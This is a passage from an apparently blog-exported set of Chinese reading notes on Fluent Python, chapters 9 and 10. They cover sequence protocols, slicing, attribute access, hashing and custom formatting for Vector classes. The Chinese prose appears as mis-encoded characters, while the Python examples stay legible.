æ–¹æ³•çš„å®ç°æœ‰é—®é¢˜ï¼Œé‚£ä¹ˆå¿…é¡»å¤„ç†ï¼Œå°½é‡è¾“å‡ºæœ‰ç”¨çš„å†…å®¹ï¼Œè®©ç”¨æˆ·èƒ½å¤Ÿè¯†åˆ«ç›®æ ‡å¯¹è±¡ã€‚_ åè®®å’Œé¸­å­ç±»å‹åœ¨ Python ä¸­åˆ›å»ºåŠŸèƒ½å®Œå–„çš„åºåˆ—ç±»å‹æ— éœ€ä½¿ç”¨ç»§æ‰¿ï¼Œåªéœ€å®ç°ç¬¦åˆåºåˆ—åè®®çš„æ–¹æ³•ã€‚ä¸è¿‡ï¼Œè¿™é‡Œè¯´çš„åè®®æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿåœ¨é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­ï¼Œåè®®æ˜¯éæ­£å¼çš„æ¥å£ï¼Œåªåœ¨æ–‡æ¡£ä¸­å®šä¹‰ï¼Œåœ¨ä»£ç ä¸­ä¸å®šä¹‰ã€‚ä¾‹å¦‚ï¼ŒPython çš„åºåˆ—åè®®åªéœ€è¦ __len__ å’Œ __getitem__ ä¸¤ä¸ªæ–¹æ³•ã€‚ä»»ä½•ç±»ï¼ˆå¦‚ Spamï¼‰ï¼Œåªè¦ä½¿ç”¨æ ‡å‡†çš„ç­¾åå’Œè¯­ä¹‰å®ç°äº†è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œå°±èƒ½ç”¨åœ¨ä»»ä½•æœŸå¾…åºåˆ—çš„åœ°æ–¹ã€‚Spam æ˜¯ä¸æ˜¯å“ªä¸ªç±»çš„å­ç±»æ— å…³ç´§è¦ï¼Œåªè¦æä¾›äº†æ‰€éœ€çš„æ–¹æ³•å³å¯ã€‚ æ³¨ï¼š é¸­å­ç±»å‹ï¼šâ€œå½“çœ‹åˆ°ä¸€åªé¸Ÿèµ°èµ·æ¥åƒé¸­å­ã€æ¸¸æ³³èµ·æ¥åƒé¸­å­ã€å«èµ·æ¥ä¹Ÿåƒé¸­å­ï¼Œé‚£ä¹ˆè¿™åªé¸Ÿå°±å¯ä»¥è¢«ç§°ä¸ºé¸­å­ã€‚â€ åè®®æ˜¯éæ­£å¼çš„ï¼Œæ²¡æœ‰å¼ºåˆ¶åŠ›ï¼Œå› æ­¤å¦‚æœä½ çŸ¥é“ç±»çš„å…·ä½“ä½¿ç”¨åœºæ™¯ï¼Œé€šå¸¸åªéœ€è¦å®ç°ä¸€ä¸ªåè®®çš„éƒ¨åˆ†ã€‚ä¾‹å¦‚ï¼Œä¸ºäº†æ”¯æŒè¿­ä»£ï¼Œåªéœ€å®ç° __getitem__ æ–¹æ³•ï¼Œæ²¡å¿…è¦æä¾› __len__æ–¹æ³•ã€‚ Vector:å¯åˆ‡ç‰‡çš„åºåˆ—æ·»åŠ __len__ å’Œ __getitem__æ–¹æ³•åå°±å¯ä»¥å®ç°åŸºæœ¬çš„åˆ‡ç‰‡äº† 1234567class Vector: # çœç•¥äº†å¾ˆå¤šè¡Œ # ... def __len__(self): return len(self._components) def __getitem__(self, index): return self._components[index] ä½†æ˜¯è¿™æ ·å®ç°çš„åˆ‡ç‰‡ä¼šå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œ å°±æ˜¯åˆ‡ç‰‡å¾—åˆ°çš„ç»“æœæ˜¯æ•°ç»„è€Œä¸æ˜¯æ–°çš„Vectorç±» åˆ‡ç‰‡åŸç†é¦–å…ˆé€šè¿‡ä¸€ä¸ªä¾‹å­æŸ¥çœ‹åˆ‡ç‰‡çš„åŸç†: 123456789101112131415&gt;&gt;&gt; class MySeq:... def __getitem__(self, index):... return index... &gt;&gt;&gt; s = MySeq()&gt;&gt;&gt; s[1]1&gt;&gt;&gt; s[1:4]slice(1, 4, None)&gt;&gt;&gt; s[1:4:2]slice(1, 4, 2)&gt;&gt;&gt; s[1:4:2, 9](slice(1, 4, 2), 9)&gt;&gt;&gt; s[1:4:2, 7:9](slice(1, 4, 2), slice(7, 9, None)) slice(1, 4, 2) è¡¨ç¤ºçš„æ˜¯ ä»1å¼€å§‹, åˆ°4ç»“æŸ, stepæ˜¯2(å·¦å¼€å³é—­) slice æœ‰ä¸€ä¸ªæœ‰è¶£çš„æ–¹æ³•indices S.indices(len) -&gt; (start, stop, stride)ç»™å®šé•¿åº¦ä¸º len çš„åºåˆ—ï¼Œè®¡ç®— S è¡¨ç¤ºçš„æ‰©å±•åˆ‡ç‰‡çš„èµ·å§‹ï¼ˆstartï¼‰å’Œç»“å°¾ï¼ˆstopï¼‰ç´¢å¼•ï¼Œä»¥åŠæ­¥å¹…ï¼ˆstrideï¼‰ã€‚è¶…å‡ºè¾¹ç•Œçš„ç´¢å¼•ä¼šè¢«æˆªæ‰ï¼Œè¿™ä¸å¸¸è§„åˆ‡ç‰‡çš„å¤„ç†æ–¹å¼ä¸€æ ·ã€‚ æ¢å¥è¯è¯´ï¼Œindices æ–¹æ³•å¼€æ”¾äº†å†…ç½®åºåˆ—å®ç°çš„æ£˜æ‰‹é€»è¾‘ï¼Œç”¨äºä¼˜é›…åœ°å¤„ç†ç¼ºå¤±ç´¢å¼•å’Œè´Ÿæ•°ç´¢å¼•ï¼Œä»¥åŠé•¿åº¦è¶…è¿‡ç›®æ ‡åºåˆ—çš„åˆ‡ç‰‡ã€‚è¿™ä¸ªæ–¹æ³•ä¼šâ€œæ•´é¡¿â€å…ƒç»„ï¼ŒæŠŠ startã€stop å’Œstride éƒ½å˜æˆéè´Ÿæ•°ï¼Œè€Œä¸”éƒ½è½åœ¨æŒ‡å®šé•¿åº¦åºåˆ—çš„è¾¹ç•Œå†…ã€‚ä¸‹é¢ä¸¾å‡ ä¸ªä¾‹å­ã€‚å‡è®¾æœ‰ä¸ªé•¿åº¦ä¸º 5 çš„åºåˆ—ï¼Œä¾‹å¦‚ â€˜ABCDEâ€™ï¼š 1234&gt;&gt;&gt; slice(None, 10, 2).indices(5)(0, 5, 2)&gt;&gt;&gt; slice(-3, None, None).indices(5)(2, 5, 1) â€˜ABCDEâ€™[:10:2] ç­‰åŒäº â€˜ABCDEâ€™[0:5:2]â€˜ABCDEâ€™[-3:] ç­‰åŒäº â€˜ABCDEâ€™[2:5:1] èƒ½å¤„ç†åˆ‡ç‰‡çš„__getitem__æ–¹æ³•å¯¹ä¸Šæ–‡æåˆ°çš„Vectorç±»çš„__getitem__æ–¹æ³• åšå‡ºå¦‚ä¸‹æ”¹åŠ¨: 123456789def __getitem__(self, index): cls = type(self) if isinstance(index, slice): return cls(self._components[index]) elif isinstance(index, numbers.Integral): return self._components[index] else: msg = '&#123;cls.__name__&#125; indices must be integers' raise TypeError(msg.format(cls=cls)) ä¼ å…¥sliceå¯¹è±¡æ—¶ï¼Œgetitemä¼šå°†_components æ•°ç»„çš„åˆ‡ç‰‡æ„å»ºæˆä¸€ä¸ªæ–°çš„ Vector å®ä¾‹ Vector ç±»ï¼š åŠ¨æ€å­˜å–å±æ€§æˆ‘ä»¬æƒ³é¢å¤–æä¾›ä¸‹è¿°å¥æ³•ï¼Œç”¨äºè¯»å–å‘é‡çš„å‰å››ä¸ªåˆ†é‡ï¼š 12345&gt;&gt;&gt; v = Vector(range(10))&gt;&gt;&gt; v.x0.0&gt;&gt;&gt; v.y, v.z, v.t(1.0, 2.0, 3.0) é¦–å…ˆæˆ‘ä»¬è¦äº†è§£ä¸€ä¸‹Pythonä¸­å¯¹è±¡çš„å±æ€§æŸ¥æ‰¾æœºåˆ¶: ç®€å•æ¥è¯´ï¼Œå¯¹ my_obj.x è¡¨è¾¾å¼ï¼ŒPython ä¼šæ£€æŸ¥ my_obj å®ä¾‹æœ‰æ²¡æœ‰åä¸º x çš„å±æ€§ï¼›å¦‚æœæ²¡æœ‰ï¼Œåˆ°ç±»ï¼ˆmy_obj.classï¼‰ä¸­æŸ¥æ‰¾ï¼›å¦‚æœè¿˜æ²¡æœ‰ï¼Œé¡ºç€ç»§æ‰¿æ ‘ç»§ç»­æŸ¥æ‰¾ã€‚ å¦‚æœä¾æ—§æ‰¾ä¸åˆ°ï¼Œè°ƒç”¨ my_obj æ‰€å±ç±»ä¸­å®šä¹‰çš„ getattr æ–¹æ³•ï¼Œä¼ å…¥ self å’Œå±æ€§åç§°çš„å­—ç¬¦ä¸²å½¢å¼ï¼ˆå¦‚ â€˜xâ€™ï¼‰ã€‚ ä¸‹é¢æˆ‘ä»¬ä¸ºVectorç±»å¢åŠ  __getattr__æ–¹æ³•: 123456789shortcut_names = 'xyzt'def __getattr__(self, name): cls = type(self) if len(name) == 1: pos = cls.shortcut_names.find(name) if 0 &lt;= pos &lt; len(self._components): return self._components[pos] msg = '&#123;.__name__!r&#125; object has no attribute &#123;!r&#125;' raise AttributeError(msg.format(cls, name) è¿™æ ·çš„å®ç°å¯ä»¥åˆæ­¥è¾¾åˆ°æˆ‘ä»¬éœ€è¦çš„æ•ˆæœï¼Œä½†æ˜¯å¯èƒ½ä¼šå‡ºç°ä¸‹é¢çš„çŸ›ç›¾æƒ…å½¢ï¼š 12345678910&gt;&gt;&gt; v = Vector(range(5))&gt;&gt;&gt; vVector([0.0, 1.0, 2.0, 3.0, 4.0])&gt;&gt;&gt; v.x0.0&gt;&gt;&gt; v.x = 10&gt;&gt;&gt; v.x10&gt;&gt;&gt; vVector([0.0, 1.0, 2.0, 3.0, 4.0]) è¿™é‡Œå¯¹v.xèµ‹å€¼å¹¶æ²¡æœ‰æ”¹å˜Vectorç¬¬ä¸€åˆ†é‡çš„å€¼ï¼Œè¿™æ ·èµ‹å€¼åªæ˜¯è®©Vectorç±»å¤šäº†ä¸€ä¸ªåä¸ºxçš„å±æ€§ã€‚ ä¸ºäº†é¿å…è¿™ç§æƒ…å†µå‡ºç°æˆ‘ä»¬éœ€è¦å®ç°ä¸€ä¸ª__setattr__æ–¹æ³•ï¼š12345678910111213def __setattr__(self, name, value): cls = type(self) if len(name) == 1: if name in cls.shortcut_names: error = 'readonly attribute &#123;attr_name!r&#125;' elif name.islower(): error = "can't set attributes 'a' to 'z' in &#123;cls_name!r&#125;" else: error = '' if error: msg = error.format(cls_name=cls.__name__, attr_name=name) raise AttributeError(msg) super().__setattr__(name, value) å¯¹å•ä¸ªå­—ç¬¦çš„å±æ€§è¿›è¡Œå•ç‹¬å¤„ç†ã€‚ æœ‰ä¸€ä¸ªé—®é¢˜è¦ç‰¹åˆ«æ³¨æ„ï¼šå¤šæ•°æ—¶å€™ï¼Œå¦‚æœå®ç°äº† getattr æ–¹æ³•ï¼Œé‚£ä¹ˆä¹Ÿè¦å®šä¹‰ setattr æ–¹æ³•ï¼Œä»¥é˜²å¯¹è±¡çš„è¡Œä¸ºä¸ä¸€è‡´ã€‚å¦‚æœæƒ³å…è®¸ä¿®æ”¹åˆ†é‡ï¼Œå¯ä»¥ä½¿ç”¨ setitem æ–¹æ³•ï¼Œæ”¯æŒ v[0] = 1.1 è¿™æ ·çš„èµ‹å€¼ï¼Œä»¥åŠï¼ˆæˆ–è€…ï¼‰å®ç° setattr æ–¹æ³•ï¼Œæ”¯æŒ v.x = 1.1 è¿™æ ·çš„èµ‹å€¼ Vectorç±»ï¼š æ•£åˆ—å’Œå¿«é€Ÿç­‰å€¼æµ‹è¯•å®ç°__hash__æ–¹æ³•ï¼ŒåŠ ä¸Šç°æœ‰çš„__eq__æ–¹æ³•æˆ‘ä»¬ä½¿ç”¨^ï¼ˆå¼‚æˆ–ï¼‰è¿ç®—ç¬¦ä¾æ¬¡è®¡ç®—å„ä¸ªåˆ†é‡çš„æ•£åˆ—å€¼ï¼Œåƒè¿™æ ·ï¼šv[0] ^ v[1] ^ v[2]â€¦ã€‚éœ€è¦ç”¨åˆ°å½’çº¦å‡½æ•°reduce ä¸‹é¢æä¾›äº†ä¸‰ç§è®¡ç®—ç´¯è®¡å¼‚æˆ–çš„æ–¹å¼ï¼š12345678910&gt;&gt;&gt; n = 0&gt;&gt;&gt; for i in range(1, 6):... n ^= i...&gt;&gt;&gt; n1 &gt;&gt;&gt; import functools&gt;&gt;&gt; functools.reduce(lambda a, b: a^b, range(6))1 &gt;&gt;&gt; import operator&gt;&gt;&gt; functools.reduce(operator.xor, range(6))1 æ˜¾ç„¶ç¬¬ä¸‰ç§æ¯”è¾ƒç®€æ´ï¼Œ æœ¬ä¹¦çš„ç¬¬äº”ç« è®²è¿‡ï¼Œ å°½é‡é¿å…lambdaè¡¨è¾¾å¼çš„ä½¿ç”¨ã€‚ å¢åŠ çš„__hash__æ–¹æ³•å¦‚ä¸‹: 123def __hash__(self): hashes = (hash(x) for x in self._components) return functools.reduce(operator.xor, hashes, 0) è¿™æ˜¯ä¸€ç§æ˜ å°„å½’çº¦è¿ç®— æ˜ å°„å½’çº¦ï¼šæŠŠå‡½æ•°åº”ç”¨åˆ°å„ä¸ªå…ƒç´ ä¸Šï¼Œç”Ÿæˆä¸€ä¸ªæ–°åºåˆ—ï¼ˆæ˜ å°„ï¼Œmapï¼‰ï¼Œç„¶åè®¡ç®—èšåˆå€¼ï¼ˆå½’çº¦ï¼Œreduceï¼‰ ä¸ºäº†æé«˜æ¯”è¾ƒçš„æ•ˆç‡ä¿®æ”¹__eq__æ–¹æ³•(ä¸¤ç§å®ç°æ–¹å¼é€»è¾‘ä¸€æ ·)ï¼š12345678910def __eq__(self, other): if len(self) != len(other): return False for a, b in zip(self, other): if a != b: return False return Truedef __eq__(self, other): return len(self) == len(other) and all(a == b for a, b in zip(self, other)) æ ¼å¼åŒ–Vector ç±»çš„ __format__ æ–¹æ³•ä¸ Vector2d ç±»çš„ç›¸ä¼¼ï¼Œä½†æ˜¯ä¸ä½¿ç”¨æåæ ‡ï¼Œè€Œä½¿ç”¨çƒé¢åæ ‡ï¼ˆä¹Ÿå«è¶…çƒé¢åæ ‡ï¼‰ï¼Œå› ä¸º Vector ç±»æ”¯æŒ n ä¸ªç»´åº¦ï¼Œè€Œè¶…è¿‡å››ç»´åï¼Œçƒä½“å˜æˆäº†â€œè¶…çƒä½“â€(nç»´çƒä½“)ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬ä¼šæŠŠè‡ªå®šä¹‰çš„æ ¼å¼åç¼€ç”± â€˜pâ€™ å˜æˆ â€˜hâ€™ä¸‹é¢æ˜¯æ ¼å¼åŒ–çš„å®ç°ï¼š 123456789101112131415161718192021import itertoolsdef angle(self, n): r = math.sqrt(sum(x * x for x in self[n:])) a = math.atan2(r, self[n-1]) if (n == len(self) - 1) and (self[-1] &lt; 0): return math.pi * 2 - a else: return adef angles(self): return (self.angle(n) for n in range(1, len(self)))def __format__(self, fmt_spec=''): if fmt_spec.endswith('h'): # è¶…çƒé¢åæ ‡ fmt_spec = fmt_spec[:-1] coords = itertools.chain([abs(self)], self.angles()) outer_fmt = '&lt;&#123;&#125;&gt;' else: coords = self outer_fmt = '(&#123;&#125;)' components = (format(c, fmt_spec) for c in coords) return outer_fmt.format(', '.join(components)) å°ç»“æˆ‘ä»¬ç»å¸¸åˆ†æ Python æ ‡å‡†å¯¹è±¡çš„è¡Œä¸ºï¼Œç„¶åè¿›è¡Œæ¨¡ä»¿ï¼Œè®© Vector çš„è¡Œä¸ºç¬¦åˆ Python é£æ ¼ã€‚]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>duck typing</tag>
        <tag>fluent python</tag>
        <tag>å¯¹è±¡</tag>
        <tag>pythonic</tag>
        <tag>slicing</tag>
        <tag>reduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python ç¬¬ä¹ç« å°ç»“]]></title>
    <url>%2F2018%2F04%2F26%2Ffluent-python-9%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬ä¹ç« è¯»ä¹¦æŠ¥å‘Š Chapter 9. A Pythonic Objectç¬¬ä¹ç« : Pythonic çš„å¯¹è±¡å¾—ç›Šäº Python æ•°æ®æ¨¡å‹ï¼Œè‡ªå®šä¹‰ç±»å‹çš„è¡Œä¸ºå¯ä»¥åƒå†…ç½®ç±»å‹é‚£æ ·è‡ªç„¶ã€‚å®ç°å¦‚æ­¤è‡ªç„¶çš„è¡Œä¸ºï¼Œé çš„ä¸æ˜¯ç»§æ‰¿ï¼Œè€Œæ˜¯é¸­å­ç±»å‹ï¼ˆduck typingï¼‰ï¼šæˆ‘ä»¬åªéœ€æŒ‰ç…§é¢„å®šè¡Œä¸ºå®ç°å¯¹è±¡æ‰€éœ€çš„æ–¹æ³•å³å¯ã€‚ æœ¬ç« åŒ…å«ä»¥ä¸‹è¯é¢˜ï¼š æ”¯æŒç”¨äºç”Ÿæˆå¯¹è±¡å…¶ä»–è¡¨ç¤ºå½¢å¼çš„å†…ç½®å‡½æ•°ï¼ˆå¦‚ repr()ã€bytes()ï¼Œç­‰ç­‰ï¼‰ ä½¿ç”¨ä¸€ä¸ªç±»æ–¹æ³•å®ç°å¤‡é€‰æ„é€ æ–¹æ³• æ‰©å±•å†…ç½®çš„ format() å‡½æ•°å’Œ str.format() æ–¹æ³•ä½¿ç”¨çš„æ ¼å¼å¾®è¯­è¨€ å®ç°åªè¯»å±æ€§ æŠŠå¯¹è±¡å˜ä¸ºå¯æ•£åˆ—çš„ï¼Œä»¥ä¾¿åœ¨é›†åˆä¸­åŠä½œä¸º dict çš„é”®ä½¿ç”¨ åˆ©ç”¨ __slots__ èŠ‚çœå†…å­˜ å¯¹è±¡è¡¨ç¤ºå½¢å¼Python æä¾›äº†ä¸¤ç§æ–¹å¼è·å–å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚ repr() ä¾¿äºå¼€å‘è€…ç†è§£çš„æ–¹å¼è¿”å›å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚ str() ä¾¿äºç”¨æˆ·ç†è§£çš„æ–¹å¼è¿”å›å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚ ä¸ºäº†ç»™å¯¹è±¡æä¾›å…¶ä»–çš„è¡¨ç¤ºå½¢å¼ï¼Œè¿˜ä¼šç”¨åˆ°å¦å¤–ä¸¤ä¸ªç‰¹æ®Šæ–¹æ³•ï¼š__bytes__ å’Œ__format__ã€‚__bytes__ æ–¹æ³•ä¸ __str__ æ–¹æ³•ç±»ä¼¼ï¼šbytes() å‡½æ•°è°ƒç”¨å®ƒè·å–å¯¹è±¡çš„å­—èŠ‚åºåˆ—è¡¨ç¤ºå½¢å¼ã€‚è€Œ __format__ æ–¹æ³•ä¼šè¢«å†…ç½®çš„ format() å‡½æ•°å’Œ str.format() æ–¹æ³•è°ƒç”¨ï¼Œä½¿ç”¨ç‰¹æ®Šçš„æ ¼å¼ä»£ç æ˜¾ç¤ºå¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼. æ„å»ºä¸€ä¸ªå‘é‡ç±»å‘é‡ç±»çš„å®ç°å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930from array import arrayimport mathclass Vector2d: # typecode æ˜¯ç±»å±æ€§ï¼Œåœ¨ Vector2d å®ä¾‹å’Œå­—èŠ‚åºåˆ—ä¹‹é—´è½¬æ¢æ—¶ä½¿ç”¨ typecode = 'd' # åˆå§‹åŒ–å‘é‡ def __init__(self, x, y): self.x = float(x) self.y = float(y) # å®šä¹‰ __iter__ æ–¹æ³•ï¼ŒæŠŠ Vector2d å®ä¾‹å˜æˆå¯è¿­ä»£çš„å¯¹è±¡ï¼Œè¿™æ ·æ‰èƒ½æ‹†åŒ…ï¼ˆä¾‹å¦‚ï¼Œx, y = my_vectorï¼‰ã€‚è¿™ä¸ªæ–¹æ³•çš„å®ç°æ–¹å¼å¾ˆç®€å•ï¼Œç›´æ¥è°ƒç”¨ç”Ÿæˆå™¨è¡¨è¾¾å¼ä¸€ä¸ªæ¥ä¸€ä¸ªäº§å‡ºåˆ†é‡ã€‚ def __iter__(self): return (i for i in (self.x, self.y)) # __repr__ æ–¹æ³•ä½¿ç”¨ &#123;!r&#125; è·å–å„ä¸ªåˆ†é‡çš„è¡¨ç¤ºå½¢å¼ï¼Œç„¶åæ’å€¼ï¼Œæ„æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼›å› ä¸º Vector2d å®ä¾‹æ˜¯å¯è¿­ä»£çš„å¯¹è±¡ï¼Œæ‰€ä»¥ *self ä¼šæŠŠ x å’Œ y åˆ†é‡æä¾›ç»™ format å‡½æ•°ã€‚ def __repr__(self): class_name = type(self).__name__ return '&#123;&#125;(&#123;!r&#125;, &#123;!r&#125;)'.format(class_name, *self) def __str__(self): return str(tuple(self)) # ä¸ºäº†ç”Ÿæˆå­—èŠ‚åºåˆ—ï¼Œæˆ‘ä»¬æŠŠ typecode è½¬æ¢æˆå­—èŠ‚åºåˆ—ï¼Œç„¶åè¿­ä»£ Vector2d å®ä¾‹ï¼Œå¾—åˆ°ä¸€ä¸ªæ•°ç»„ï¼Œå†æŠŠæ•°ç»„è½¬æ¢æˆå­—èŠ‚åºåˆ—ã€‚ def __bytes__(self): return (bytes([ord(self.typecode)])+bytes(array(self.typecode, self))) # æ¯”è¾ƒå‘é‡çš„å€¼ def __eq__(self, other): return tuple(self) == tuple(other) # âˆšx^2+y^2 def __abs__(self): return math.hypot(self.x, self.y) # å°†æ¨¡çš„å€¼è½¬åŒ–æˆå¸ƒå°”å€¼ def __bool__(self): return bool(abs(self)) å¤‡é€‰æ„é€ æ–¹æ³•ä¸Šä¸€èŠ‚çš„vectorå®ä¾‹å¯ä»¥å°†vectorè½¬åŒ–æˆå­—èŠ‚åºåˆ—ï¼ŒåŒç†æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†å­—èŠ‚åºåˆ—è½¬åŒ–æˆvectorã€‚ vector2d_v1.pyï¼š 123456789101112from vector2d_v0 import Vector2d as vecclass Vector2d(vec): # ç±»æ–¹æ³• @classmethod # ä½¿ç”¨clsä¼ å…¥ç±»æœ¬èº« def frombytes(cls, octets): typecode = chr(octets[0]) # åˆ›å»ºmemoryviewï¼Œä½¿ç”¨typecodeè½¬æ¢ memv = memoryview(octets[1:]).cast(typecode) # æ‹†åŒ…memoryview, æ„é€ å‘é‡ return cls(*memv) classmethod å’Œ staticmethodpython æä¾›äº†ä¸¤ä¸ªè£…é¥°å™¨æ¥è£…é¥°ç±»ä¸­å®šä¹‰çš„æ–¹æ³•ï¼šclassmethod å’Œ staticmethod classmethod ç”¨æ¥å®šä¹‰æ“ä½œç±»è€Œä¸æ˜¯æ“ä½œå®ä¾‹çš„æ–¹æ³•ã€‚classmethod æœ€å¸¸è§çš„æ–¹å¼å°±æ˜¯å®šä¹‰å¤‡ç”¨çš„æ„é€ æ–¹æ³•ã€‚ staticmethod ç”¨æ¥å®šä¹‰ä¸å®ä¾‹æ— å…³çš„ä¸€äº›æ“ä½œï¼Œç›¸å½“äºå®šä½åœ¨ç±»ä¸­çš„æ™®é€šå‡½æ•° æ ¼å¼åŒ–æ˜¾ç¤ºå†…ç½®çš„ format() å‡½æ•°å’Œ str.format() æ–¹æ³•æŠŠå„ä¸ªç±»å‹çš„æ ¼å¼åŒ–æ–¹å¼å§”æ‰˜ç»™ç›¸åº”çš„.__format__(format_spec) æ–¹æ³•ã€‚format_spec æ˜¯æ ¼å¼è¯´æ˜ç¬¦ï¼Œå®ƒæ˜¯ï¼šformat(my_obj, format_spec) çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œæˆ–è€…str.format() æ–¹æ³•çš„æ ¼å¼å­—ç¬¦ä¸²ï¼Œ{} é‡Œä»£æ¢å­—æ®µä¸­å†’å·åé¢çš„éƒ¨åˆ†. 1234567&gt;&gt;&gt; brl = 1/2.43&gt;&gt;&gt; brl0.4115226337448559&gt;&gt;&gt; format(brl, '0.4f') #ã€1ã€‘'0.4115'&gt;&gt;&gt; '1 BRL = &#123;rate:0.2f&#125; USD'.format(rate=brl) #ã€2ã€‘'1 BRL = 0.41 USD' ã€1ã€‘ä¸­çš„â€™0.4fâ€™æ˜¯æ ¼å¼è¯´æ˜ç¬¦ã€2ã€‘ä¸­æ ¼å¼è¯´æ˜ç¬¦æ˜¯â€™0.2fâ€™, â€˜rateâ€™æ˜¯å­—æ®µåç§°ï¼Œâ€™{0.mass:5.3e}â€™è¿™æ ·çš„æ ¼å¼ä¸­ï¼Œ â€˜0.massâ€™æ˜¯å­—æ®µå, â€˜5.3eâ€™æ˜¯æ ¼å¼ æ ¼å¼è§„èŒƒå¾®è¯­è¨€: æ ¼å¼è¯´æ˜ç¬¦ä½¿ç”¨çš„è¡¨ç¤ºæ³•, æ ¼å¼è§„èŒƒå¾®è¯­è¨€æ˜¯å¯æ‰©å±•çš„ï¼Œå› ä¸ºå„ä¸ªç±»å¯ä»¥è‡ªè¡Œå†³å®šå¦‚ä½•è§£é‡Š format_spec å‚æ•°ã€‚ é¦–å…ˆå®ç°ä¸€ä¸ªç®€å•çš„æ ¼å¼åŒ–æ–¹æ³•ï¼š 123def __format__(self, fmt_spec=''): components = (format(c, fmt_spec) for c in self) return '(&#123;&#125;, &#123;&#125;)'.format(*components) è¿™æ ·å¯ä»¥å®ç°å¦‚ä¸‹æ•ˆæœï¼š 1234567&gt;&gt;&gt; v1 = Vector2d(3, 4)&gt;&gt;&gt; format(v1)'(3.0, 4.0)'&gt;&gt;&gt; format(v1, '.2f')'(3.00, 4.00)'&gt;&gt;&gt; format(v1, '.3e')'(3.000e+00, 4.000e+00)' ä¸‹é¢å¢åŠ ä¸€ä¸ªè‡ªå®šä¹‰çš„æ ¼å¼è¯´æ˜ç¬¦p, å¦‚æœæ ¼å¼è¯´æ˜ç¬¦ä»¥ â€˜pâ€™ ç»“å°¾ï¼Œé‚£ä¹ˆåœ¨æåæ ‡ä¸­æ˜¾ç¤ºå‘é‡ï¼Œå³ &lt;r, Î¸&gt;ï¼Œå…¶ä¸­ r æ˜¯æ¨¡ï¼ŒÎ¸æ˜¯å¼§åº¦ ä¸‹é¢æ˜¯å®ç°ï¼š 12345678910111213def angle(self): return math.atan2(self.y, self.x)def __format__(self, fmt_spec=''): if fmt_spec.endswith('p'): fmt_spec = fmt_spec[:-1] coords = (abs(self), self.angle()) outer_fmt = '&lt;&#123;&#125;, &#123;&#125;&gt;' else: coords = self outer_fmt = '(&#123;&#125;, &#123;&#125;)' components = (format(c, fmt_spec) for c in coords) return outer_fmt.format(*components) å¯æ•£åˆ—çš„(hashable)Vector2dä»£ç è§ vector2d_v3.pyç›®å‰Vector2dæ˜¯ä¸å¯æ•£åˆ—çš„ï¼Œ å› æ­¤ä¸èƒ½æ”¾å…¥é›†åˆä¸­ï¼Œä¸ºäº†ä½¿å¾—Vector2då˜æˆå¯æ•£åˆ—çš„ï¼Œéœ€è¦å®ç°__hash__ï¼Œå¹¶ä¸”è®©Vector2dä¸å¯å˜ é¦–å…ˆéœ€è¦è®©Vector2dä¸å¯å˜(ä½¿ç”¨@propertyè£…é¥°å™¨è£…é¥°è¯»å€¼æ–¹æ³•(getter)): 123456789def __init__(self, x, y): self.__x = float(x) self.__y = float(y)@propertydef x(self): return self.__x@propertydef y(self): return self.__y è¿™æ ·xå’Œyéƒ½æ˜¯åªè¯»çš„äº†ã€‚æ¥ä¸‹æ¥å®ç°__hash__æ–¹æ³•:123456789101112131415161718192021222324def __hash__(self): return hash(self.x) ^ hash(self.y)``` _æ³¨ï¼š å¦‚æœè¦å®ç°ä¸€ä¸ªå¯æ•£åˆ—çš„ç±»å‹ï¼Œä¸ä¸€å®šè¦ä¿æŠ¤å®ä¾‹å˜é‡å±æ€§æˆ–è€…å®ç°properties,åªéœ€è¦æ­£ç¡®å®ç°\_\_hash\_\_å’Œ\_\_eq\_\_å³å¯ï¼Œä½†æ˜¯å®ä¾‹çš„hashå€¼ç»å¯¹ä¸åº”è¯¥æ”¹å˜ï¼Œæ‰€ä»¥è¿™é‡Œä¼šæåˆ°åªè¯»ç‰¹æ€§_## Pythonä¸­çš„ç§æœ‰å±æ€§å’Œå—ä¿æŠ¤çš„å±æ€§ä¸ºäº†é¿å…å­ç±»è¦†ç›–çˆ¶ç±»çš„ç§æœ‰å±æ€§ï¼Œå¦‚æœä»¥ \_\_mood çš„å½¢å¼ï¼ˆä¸¤ä¸ªå‰å¯¼ä¸‹åˆ’çº¿ï¼Œå°¾éƒ¨æ²¡æœ‰æˆ–æœ€å¤šæœ‰ä¸€ä¸ªä¸‹åˆ’çº¿ï¼‰å‘½åå®ä¾‹å±æ€§ï¼ŒPython ä¼šæŠŠå±æ€§åå­˜å…¥å®ä¾‹çš„ \_\_dict\_\_ å±æ€§ä¸­ï¼Œè€Œä¸”ä¼šåœ¨å‰é¢åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿å’Œç±»åã€‚å› æ­¤ï¼Œå¯¹ Dog ç±»æ¥è¯´ï¼Œ\_\_mood ä¼šå˜æˆ \_Dog\_\_moodï¼›å¯¹ Beagleç±»æ¥è¯´ï¼Œä¼šå˜æˆ \_Beagle\_\_moodã€‚è¿™ä¸ªè¯­è¨€ç‰¹æ€§å«åç§°æ”¹å†™ï¼ˆname manglingï¼‰ã€‚_éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ åç§°æ”¹å†™æ˜¯ä¸€ç§å®‰å…¨æªæ–½ï¼Œä¸èƒ½ä¿è¯ä¸‡æ— ä¸€å¤±ï¼šå®ƒçš„ç›®çš„æ˜¯é¿å…æ„å¤–è®¿é—®ï¼Œä¸èƒ½é˜²æ­¢æ•…æ„åšé”™äº‹_Python 